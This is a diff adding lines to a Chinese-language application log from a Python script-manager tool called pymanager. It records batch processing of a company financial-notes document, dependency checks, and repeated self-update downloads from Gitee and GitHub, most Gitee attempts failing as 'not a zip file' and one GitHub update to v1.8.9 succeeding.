+[2026-04-28 22:16:01] 处理完成：成功 0 / 总计 1
+[2026-04-28 22:18:53] 开始批量处理：共 1 个文件
+[2026-04-28 22:18:53] 输出目录：C:/Users/ahdsz/Desktop
+[2026-04-28 22:18:53] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:18:56] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:18:56] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:20:41] 开始批量处理：共 1 个文件
+[2026-04-28 22:20:41] 输出目录：output
+[2026-04-28 22:20:41] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:20:43] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:20:43] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:23:07] 开始批量处理：共 1 个文件
+[2026-04-28 22:23:07] 输出目录：C:/Users/ahdsz/Desktop
+[2026-04-28 22:23:07] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:23:09] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:23:09] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:25:05] 开始批量处理：共 1 个文件
+[2026-04-28 22:25:05] 输出目录：output
+[2026-04-28 22:25:05] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:25:07] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:25:07] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:26:46] 开始批量处理：共 1 个文件
+[2026-04-28 22:26:46] 输出目录：C:/Users/ahdsz/Desktop
+[2026-04-28 22:26:46] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:26:48] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:26:48] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:29:18] 开始批量处理：共 1 个文件
+[2026-04-28 22:29:18] 输出目录：output
+[2026-04-28 22:29:18] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:29:21] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:29:21] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:33:49] 开始批量处理：共 1 个文件
+[2026-04-28 22:33:49] 输出目录：output
+[2026-04-28 22:33:49] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:33:51] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:33:51] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:36:20] 开始批量处理：共 1 个文件
+[2026-04-28 22:36:20] 输出目录：C:/Users/ahdsz/Desktop
+[2026-04-28 22:36:20] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:36:22] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后_优化后.docx
+[2026-04-28 22:36:22] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:37:28] 开始批量处理：共 1 个文件
+[2026-04-28 22:37:28] 输出目录：output
+[2026-04-28 22:37:28] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:37:30] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:37:30] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:38:50] 开始批量处理：共 1 个文件
+[2026-04-28 22:38:50] 输出目录：output
+[2026-04-28 22:38:50] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:38:52] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:38:52] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:39:48] 开始批量处理：共 1 个文件
+[2026-04-28 22:39:48] 输出目录：output
+[2026-04-28 22:39:48] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:39:50] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:39:50] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:41:16] 开始批量处理：共 1 个文件
+[2026-04-28 22:41:16] 输出目录：output
+[2026-04-28 22:41:16] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:41:18] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:41:18] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:42:41] 开始批量处理：共 1 个文件
+[2026-04-28 22:42:41] 输出目录：output
+[2026-04-28 22:42:41] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:42:43] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:42:43] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:49:13] ─── 框架依赖检查 ───
+[2026-04-28 22:49:13] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 22:49:13] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 22:49:14] [Gitee] 最新版本: 1.8.8, 下载链接: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:49:14] 当前已是最新版本 v1.8.8
+[2026-04-28 22:49:16] 开始下载更新到：C:\Users\ahdsz\AppData\Local\Temp\tmp6k8x4b9b\1.8.8.zip
+[2026-04-28 22:49:16] 开始下载文件，URL: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:49:16] 目标路径: C:\Users\ahdsz\AppData\Local\Temp\tmp6k8x4b9b\1.8.8.zip
+[2026-04-28 22:49:17] 下载中... (8192 bytes)
+[2026-04-28 22:49:17] 下载中... (16384 bytes)
+[2026-04-28 22:49:17] 下载中... (24576 bytes)
+[2026-04-28 22:49:17] 下载中... (32768 bytes)
+[2026-04-28 22:49:17] 下载中... (40960 bytes)
+[2026-04-28 22:49:17] 下载中... (47933 bytes)
+[2026-04-28 22:49:17] 下载完成: C:\Users\ahdsz\AppData\Local\Temp\tmp6k8x4b9b\1.8.8.zip
+[2026-04-28 22:49:17] 下载完成，开始应用更新
+[2026-04-28 22:49:17] 开始应用更新，当前文件：c:\Users\ahdsz\Documents\GitHub\pymanager\main.pyw
+[2026-04-28 22:49:17] 项目目录：c:\Users\ahdsz\Documents\GitHub\pymanager
+[2026-04-28 22:49:17] 下载路径：C:\Users\ahdsz\AppData\Local\Temp\tmp6k8x4b9b\1.8.8.zip
+[2026-04-28 22:49:17] 创建备份：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_01.zip
+[2026-04-28 22:49:17] 备份创建成功：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_01.zip
+[2026-04-28 22:49:17] 备份已创建：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_01.zip
+[2026-04-28 22:49:17] 解压到临时目录：C:\Users\ahdsz\AppData\Local\Temp\tmp27jfjilz
+[2026-04-28 22:49:18] [错误] 应用更新过程中发生错误：File is not a zip file
+[2026-04-28 22:50:02] [Gitee] 最新版本: 1.8.8, 下载链接: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:50:02] 当前已是最新版本 v1.8.8
+[2026-04-28 22:50:04] 开始下载更新到：C:\Users\ahdsz\AppData\Local\Temp\tmp5ny8fc8f\1.8.8.zip
+[2026-04-28 22:50:04] 开始下载文件，URL: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:50:04] 目标路径: C:\Users\ahdsz\AppData\Local\Temp\tmp5ny8fc8f\1.8.8.zip
+[2026-04-28 22:50:05] 下载中... (8192 bytes)
+[2026-04-28 22:50:05] 下载中... (16384 bytes)
+[2026-04-28 22:50:05] 下载中... (24576 bytes)
+[2026-04-28 22:50:05] 下载中... (32768 bytes)
+[2026-04-28 22:50:05] 下载中... (40960 bytes)
+[2026-04-28 22:50:05] 下载中... (47933 bytes)
+[2026-04-28 22:50:05] 下载完成: C:\Users\ahdsz\AppData\Local\Temp\tmp5ny8fc8f\1.8.8.zip
+[2026-04-28 22:50:05] 下载完成，开始应用更新
+[2026-04-28 22:50:05] 开始应用更新，当前文件：c:\Users\ahdsz\Documents\GitHub\pymanager\main.pyw
+[2026-04-28 22:50:05] 项目目录：c:\Users\ahdsz\Documents\GitHub\pymanager
+[2026-04-28 22:50:05] 下载路径：C:\Users\ahdsz\AppData\Local\Temp\tmp5ny8fc8f\1.8.8.zip
+[2026-04-28 22:50:05] 创建备份：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_02.zip
+[2026-04-28 22:50:05] 备份创建成功：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_02.zip
+[2026-04-28 22:50:05] 备份已创建：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_02.zip
+[2026-04-28 22:50:05] 解压到临时目录：C:\Users\ahdsz\AppData\Local\Temp\tmpgdyazea9
+[2026-04-28 22:50:05] [错误] 应用更新过程中发生错误：File is not a zip file
+[2026-04-28 22:50:10] ─── 框架依赖检查 ───
+[2026-04-28 22:50:10] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 22:50:10] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 22:50:11] [Gitee] 最新版本: 1.8.8, 下载链接: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:50:11] 当前已是最新版本 v1.8.8
+[2026-04-28 22:50:12] 开始下载更新到：C:\Users\ahdsz\AppData\Local\Temp\tmp0txvpfmw\1.8.8.zip
+[2026-04-28 22:50:12] 开始下载文件，URL: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:50:12] 目标路径: C:\Users\ahdsz\AppData\Local\Temp\tmp0txvpfmw\1.8.8.zip
+[2026-04-28 22:50:13] 下载中... (8192 bytes)
+[2026-04-28 22:50:13] 下载中... (16384 bytes)
+[2026-04-28 22:50:13] 下载中... (24576 bytes)
+[2026-04-28 22:50:13] 下载中... (32768 bytes)
+[2026-04-28 22:50:13] 下载中... (40960 bytes)
+[2026-04-28 22:50:13] 下载中... (47933 bytes)
+[2026-04-28 22:50:13] 下载完成: C:\Users\ahdsz\AppData\Local\Temp\tmp0txvpfmw\1.8.8.zip
+[2026-04-28 22:50:13] 下载完成，开始应用更新
+[2026-04-28 22:50:13] 开始应用更新，当前文件：c:\Users\ahdsz\Documents\GitHub\pymanager\main.pyw
+[2026-04-28 22:50:13] 项目目录：c:\Users\ahdsz\Documents\GitHub\pymanager
+[2026-04-28 22:50:13] 下载路径：C:\Users\ahdsz\AppData\Local\Temp\tmp0txvpfmw\1.8.8.zip
+[2026-04-28 22:50:13] 创建备份：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_03.zip
+[2026-04-28 22:50:13] 备份创建成功：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_03.zip
+[2026-04-28 22:50:13] 备份已创建：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_03.zip
+[2026-04-28 22:50:13] 解压到临时目录：C:\Users\ahdsz\AppData\Local\Temp\tmp36rvxwcg
+[2026-04-28 22:50:13] [错误] 应用更新过程中发生错误：File is not a zip file
+[2026-04-28 22:51:39] [Gitee] 最新版本: 1.8.8, 下载链接: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:51:39] 当前已是最新版本 v1.8.8
+[2026-04-28 22:51:40] 开始下载更新到：C:\Users\ahdsz\AppData\Local\Temp\tmp08n43596\1.8.8.zip
+[2026-04-28 22:51:40] 开始下载文件，URL: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:51:40] 目标路径: C:\Users\ahdsz\AppData\Local\Temp\tmp08n43596\1.8.8.zip
+[2026-04-28 22:51:41] 下载中... (8192 bytes)
+[2026-04-28 22:51:41] 下载中... (16384 bytes)
+[2026-04-28 22:51:41] 下载中... (24576 bytes)
+[2026-04-28 22:51:41] 下载中... (32768 bytes)
+[2026-04-28 22:51:41] 下载中... (40960 bytes)
+[2026-04-28 22:51:41] 下载中... (47933 bytes)
+[2026-04-28 22:51:41] 下载完成: C:\Users\ahdsz\AppData\Local\Temp\tmp08n43596\1.8.8.zip
+[2026-04-28 22:51:41] 下载完成，开始应用更新
+[2026-04-28 22:51:41] 开始应用更新，当前文件：c:\Users\ahdsz\Documents\GitHub\pymanager\main.pyw
+[2026-04-28 22:51:41] 项目目录：c:\Users\ahdsz\Documents\GitHub\pymanager
+[2026-04-28 22:51:41] 下载路径：C:\Users\ahdsz\AppData\Local\Temp\tmp08n43596\1.8.8.zip
+[2026-04-28 22:51:41] 创建备份：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_04.zip
+[2026-04-28 22:51:42] 备份创建成功：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_04.zip
+[2026-04-28 22:51:42] 备份已创建：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_04.zip
+[2026-04-28 22:51:42] 解压到临时目录：C:\Users\ahdsz\AppData\Local\Temp\tmpw9f4fim4
+[2026-04-28 22:51:42] [错误] 应用更新过程中发生错误：File is not a zip file
+[2026-04-28 22:52:30] [Gitee] 最新版本: 1.8.8, 下载链接: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:52:30] 当前已是最新版本 v1.8.8
+[2026-04-28 22:52:31] 开始下载更新到：C:\Users\ahdsz\AppData\Local\Temp\tmpb3dpej3n\1.8.8.zip
+[2026-04-28 22:52:31] 开始下载文件，URL: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:52:31] 目标路径: C:\Users\ahdsz\AppData\Local\Temp\tmpb3dpej3n\1.8.8.zip
+[2026-04-28 22:52:32] 下载中... (8192 bytes)
+[2026-04-28 22:52:32] 下载中... (16384 bytes)
+[2026-04-28 22:52:32] 下载中... (24576 bytes)
+[2026-04-28 22:52:32] 下载中... (32768 bytes)
+[2026-04-28 22:52:32] 下载中... (40960 bytes)
+[2026-04-28 22:52:32] 下载中... (47933 bytes)
+[2026-04-28 22:52:32] 下载完成: C:\Users\ahdsz\AppData\Local\Temp\tmpb3dpej3n\1.8.8.zip
+[2026-04-28 22:52:32] 下载完成，开始应用更新
+[2026-04-28 22:52:32] 开始应用更新，当前文件：c:\Users\ahdsz\Documents\GitHub\pymanager\main.pyw
+[2026-04-28 22:52:32] 项目目录：c:\Users\ahdsz\Documents\GitHub\pymanager
+[2026-04-28 22:52:32] 下载路径：C:\Users\ahdsz\AppData\Local\Temp\tmpb3dpej3n\1.8.8.zip
+[2026-04-28 22:52:32] 创建备份：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_05.zip
+[2026-04-28 22:52:32] 备份创建成功：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_05.zip
+[2026-04-28 22:52:32] 备份已创建：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_05.zip
+[2026-04-28 22:52:32] 解压到临时目录：C:\Users\ahdsz\AppData\Local\Temp\tmpa1ynqsdr
+[2026-04-28 22:52:32] [错误] 应用更新过程中发生错误：File is not a zip file
+[2026-04-28 22:52:36] [Gitee] 最新版本: 1.8.8, 下载链接: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:52:36] 当前已是最新版本 v1.8.8
+[2026-04-28 22:52:37] 开始下载更新到：C:\Users\ahdsz\AppData\Local\Temp\tmpbcfv4h9n\1.8.8.zip
+[2026-04-28 22:52:37] 开始下载文件，URL: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:52:37] 目标路径: C:\Users\ahdsz\AppData\Local\Temp\tmpbcfv4h9n\1.8.8.zip
+[2026-04-28 22:52:38] 下载中... (8192 bytes)
+[2026-04-28 22:52:38] 下载中... (16384 bytes)
+[2026-04-28 22:52:38] 下载中... (24576 bytes)
+[2026-04-28 22:52:38] 下载中... (32768 bytes)
+[2026-04-28 22:52:38] 下载中... (40960 bytes)
+[2026-04-28 22:52:38] 下载中... (47933 bytes)
+[2026-04-28 22:52:38] 下载完成: C:\Users\ahdsz\AppData\Local\Temp\tmpbcfv4h9n\1.8.8.zip
+[2026-04-28 22:52:38] 下载完成，开始应用更新
+[2026-04-28 22:52:38] 开始应用更新，当前文件：c:\Users\ahdsz\Documents\GitHub\pymanager\main.pyw
+[2026-04-28 22:52:38] 项目目录：c:\Users\ahdsz\Documents\GitHub\pymanager
+[2026-04-28 22:52:38] 下载路径：C:\Users\ahdsz\AppData\Local\Temp\tmpbcfv4h9n\1.8.8.zip
+[2026-04-28 22:52:38] 创建备份：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_06.zip
+[2026-04-28 22:52:38] 备份创建成功：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_06.zip
+[2026-04-28 22:52:38] 备份已创建：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_06.zip
+[2026-04-28 22:52:38] 解压到临时目录：C:\Users\ahdsz\AppData\Local\Temp\tmp74v_2edx
+[2026-04-28 22:52:38] [错误] 应用更新过程中发生错误：File is not a zip file
+[2026-04-28 22:52:42] ─── 框架依赖检查 ───
+[2026-04-28 22:52:42] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 22:52:42] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 22:52:43] [Gitee] 最新版本: 1.8.8, 下载链接: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:52:43] 当前已是最新版本 v1.8.8
+[2026-04-28 22:52:44] 开始下载更新到：C:\Users\ahdsz\AppData\Local\Temp\tmpczci0l0z\1.8.8.zip
+[2026-04-28 22:52:44] 开始下载文件，URL: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:52:44] 目标路径: C:\Users\ahdsz\AppData\Local\Temp\tmpczci0l0z\1.8.8.zip
+[2026-04-28 22:52:45] 下载中... (8192 bytes)
+[2026-04-28 22:52:45] 下载中... (16384 bytes)
+[2026-04-28 22:52:45] 下载中... (24576 bytes)
+[2026-04-28 22:52:45] 下载中... (32768 bytes)
+[2026-04-28 22:52:45] 下载中... (40960 bytes)
+[2026-04-28 22:52:45] 下载中... (47933 bytes)
+[2026-04-28 22:52:45] 下载完成: C:\Users\ahdsz\AppData\Local\Temp\tmpczci0l0z\1.8.8.zip
+[2026-04-28 22:52:45] 下载完成，开始应用更新
+[2026-04-28 22:52:45] 开始应用更新，当前文件：c:\Users\ahdsz\Documents\GitHub\pymanager\main.pyw
+[2026-04-28 22:52:45] 项目目录：c:\Users\ahdsz\Documents\GitHub\pymanager
+[2026-04-28 22:52:45] 下载路径：C:\Users\ahdsz\AppData\Local\Temp\tmpczci0l0z\1.8.8.zip
+[2026-04-28 22:52:45] 创建备份：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_07.zip
+[2026-04-28 22:52:45] 备份创建成功：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_07.zip
+[2026-04-28 22:52:45] 备份已创建：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_07.zip
+[2026-04-28 22:52:45] 解压到临时目录：C:\Users\ahdsz\AppData\Local\Temp\tmp5sbg2pb7
+[2026-04-28 22:52:45] [错误] 应用更新过程中发生错误：File is not a zip file
+[2026-04-28 22:58:37] ─── 框架依赖检查 ───
+[2026-04-28 22:58:37] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 22:58:37] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 22:58:38] [Gitee] 最新版本: 1.8.8, 下载链接: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:58:38] 当前已是最新版本 v1.8.8
+[2026-04-28 22:58:45] ─── 框架依赖检查 ───
+[2026-04-28 22:58:45] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 22:58:45] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 22:58:46] [Gitee] 最新版本: 1.8.8, 下载链接: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:58:46] 当前已是最新版本 v1.8.8
+[2026-04-28 23:01:09] ─── 框架依赖检查 ───
+[2026-04-28 23:01:09] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 23:01:09] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 23:01:13] [GitHub] 最新版本: 1.8.7, 下载链接: https://api.github.com/repos/zhangyapu1/pymanager/zipball/1.8.7
+[2026-04-28 23:01:13] 当前已是最新版本 v1.8.8
+[2026-04-28 23:13:08] ─── 框架依赖检查 ───
+[2026-04-28 23:13:08] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 23:13:08] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 23:13:36] ─── 框架依赖检查 ───
+[2026-04-28 23:13:36] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 23:13:36] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 23:13:39] [Cloudflare] 检查更新: https://snowy-recipe-80d5.ahdszyp.workers.dev/api/version
+[2026-04-28 23:13:44] [错误] Cloudflare更新检查失败，回退到GitHub: <urlopen error [SSL: UNEXPECTED_EOF_WHILE_READING] EOF occurred in violation of protocol (_ssl.c:1081)>
+[2026-04-28 23:13:45] [GitHub] 最新版本: 1.8.9, 下载链接: https://api.github.com/repos/zhangyapu1/pymanager/zipball/v1.8.9
+[2026-04-28 23:13:45] 当前已是最新版本 v1.8.9
+[2026-04-28 23:14:12] 开始下载更新到：C:\Users\ahdsz\AppData\Local\Temp\tmp9nizikjx\v1.8.9.zip
+[2026-04-28 23:14:12] 开始下载文件，URL: https://api.github.com/repos/zhangyapu1/pymanager/zipball/v1.8.9
+[2026-04-28 23:14:12] 目标路径: C:\Users\ahdsz\AppData\Local\Temp\tmp9nizikjx\v1.8.9.zip
+[2026-04-28 23:14:13] 下载中... (8192 bytes)
+[2026-04-28 23:14:13] 下载中... (16384 bytes)
+[2026-04-28 23:14:14] 下载中... (24576 bytes)
+[2026-04-28 23:14:14] 下载中... (32768 bytes)
+[2026-04-28 23:14:14] 下载中... (40960 bytes)
+[2026-04-28 23:14:14] 下载中... (49152 bytes)
+[2026-04-28 23:14:14] 下载中... (57344 bytes)
+[2026-04-28 23:14:14] 下载中... (65536 bytes)
+[2026-04-28 23:14:15] 下载中... (73728 bytes)
+[2026-04-28 23:14:15] 下载中... (81920 bytes)
+[2026-04-28 23:14:15] 下载中... (90112 bytes)
+[2026-04-28 23:14:15] 下载中... (98304 bytes)
+[2026-04-28 23:14:15] 下载中... (106496 bytes)
+[2026-04-28 23:14:16] 下载中... (114688 bytes)
+[2026-04-28 23:14:16] 下载中... (122880 bytes)
+[2026-04-28 23:14:16] 下载中... (131072 bytes)
+[2026-04-28 23:14:17] 下载中... (139264 bytes)
+[2026-04-28 23:14:17] 下载中... (147456 bytes)
+[2026-04-28 23:14:17] 下载中... (155648 bytes)
+[2026-04-28 23:14:17] 下载中... (163840 bytes)
+[2026-04-28 23:14:18] 下载中... (172032 bytes)
+[2026-04-28 23:14:18] 下载中... (180224 bytes)
+[2026-04-28 23:14:18] 下载中... (188416 bytes)
+[2026-04-28 23:14:18] 下载中... (196608 bytes)
+[2026-04-28 23:14:19] 下载中... (204800 bytes)
+[2026-04-28 23:14:20] 下载中... (212992 bytes)
+[2026-04-28 23:14:20] 下载中... (221184 bytes)
+[2026-04-28 23:14:20] 下载中... (229376 bytes)
+[2026-04-28 23:14:20] 下载中... (237568 bytes)
+[2026-04-28 23:14:21] 下载中... (245760 bytes)
+[2026-04-28 23:14:21] 下载中... (253952 bytes)
+[2026-04-28 23:14:21] 下载中... (262144 bytes)
+[2026-04-28 23:14:21] 下载中... (270336 bytes)
+[2026-04-28 23:14:22] 下载中... (278528 bytes)
+[2026-04-28 23:14:22] 下载中... (286720 bytes)
+[2026-04-28 23:14:23] 下载中... (294912 bytes)
+[2026-04-28 23:14:23] 下载中... (303104 bytes)
+[2026-04-28 23:14:23] 下载中... (311296 bytes)
+[2026-04-28 23:14:23] 下载中... (319488 bytes)
+[2026-04-28 23:14:23] 下载中... (327680 bytes)
+[2026-04-28 23:14:24] 下载中... (335872 bytes)
+[2026-04-28 23:14:24] 下载中... (344064 bytes)
+[2026-04-28 23:14:24] 下载中... (352256 bytes)
+[2026-04-28 23:14:24] 下载中... (360448 bytes)
+[2026-04-28 23:14:24] 下载中... (368640 bytes)
+[2026-04-28 23:14:24] 下载中... (376832 bytes)
+[2026-04-28 23:14:25] 下载中... (385024 bytes)
+[2026-04-28 23:14:25] 下载中... (393216 bytes)
+[2026-04-28 23:14:25] 下载中... (401408 bytes)
+[2026-04-28 23:14:25] 下载中... (409600 bytes)
+[2026-04-28 23:14:25] 下载中... (416270 bytes)
+[2026-04-28 23:14:25] 下载完成: C:\Users\ahdsz\AppData\Local\Temp\tmp9nizikjx\v1.8.9.zip
+[2026-04-28 23:14:25] 下载完成，开始应用更新
+[2026-04-28 23:14:25] 开始应用更新，当前文件：c:\Users\ahdsz\Documents\GitHub\pymanager\main.pyw
+[2026-04-28 23:14:25] 项目目录：c:\Users\ahdsz\Documents\GitHub\pymanager
+[2026-04-28 23:14:25] 下载路径：C:\Users\ahdsz\AppData\Local\Temp\tmp9nizikjx\v1.8.9.zip
+[2026-04-28 23:14:25] 创建备份：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_08.zip
+[2026-04-28 23:14:26] 备份创建成功：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_08.zip
+[2026-04-28 23:14:26] 备份已创建：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_08.zip
+[2026-04-28 23:14:26] 解压到临时目录：C:\Users\ahdsz\AppData\Local\Temp\tmpdjrk8_8v
+[2026-04-28 23:14:26] 检测到单目录压缩包，使用子目录：zhangyapu1-pymanager-4664e8d
+[2026-04-28 23:14:26] 已删除废弃文件: .gitignore
+[2026-04-28 23:14:26] 已删除废弃文件: REQUIREMENTS.md
+[2026-04-28 23:14:26] 已删除废弃目录: .trae
+[2026-04-28 23:14:26] 已删除空目录: modules\script_market
+[2026-04-28 23:14:26] 共清理 2 个废弃文件
+[2026-04-28 23:14:26] 共清理 1 个空目录
+[2026-04-28 23:14:26] 文件覆盖完成，准备重启...
+[2026-04-28 23:14:26] 已创建更新脚本：C:\Users\ahdsz\AppData\Local\Temp\pymanager_update.bat
+[2026-04-28 23:14:26] 更新脚本已启动，当前程序即将退出
+[2026-04-28 23:14:35] [Cloudflare] 检查更新: https://snowy-recipe-80d5.ahdszyp.workers.dev/api/version
+[2026-04-28 23:14:40] [错误] Cloudflare更新检查失败，回退到GitHub: <urlopen error [SSL: UNEXPECTED_EOF_WHILE_READING] EOF occurred in violation of protocol (_ssl.c:1081)>
+[2026-04-28 23:14:41] [GitHub] 最新版本: 1.8.9, 下载链接: https://api.github.com/repos/zhangyapu1/pymanager/zipball/v1.8.9
+[2026-04-28 23:14:41] 当前已是最新版本 v1.8.9
+[2026-04-28 23:14:52] ─── 框架依赖检查 ───
+[2026-04-28 23:14:52] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 23:14:52] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 23:14:55] [Cloudflare] 检查更新: https://snowy-recipe-80d5.ahdszyp.workers.dev/api/version
+[2026-04-28 23:15:00] [错误] Cloudflare更新检查失败，回退到GitHub: <urlopen error [SSL: UNEXPECTED_EOF_WHILE_READING] EOF occurred in violation of protocol (_ssl.c:1081)>
+[2026-04-28 23:15:00] [GitHub] 最新版本: 1.8.9, 下载链接: https://api.github.com/repos/zhangyapu1/pymanager/zipball/v1.8.9
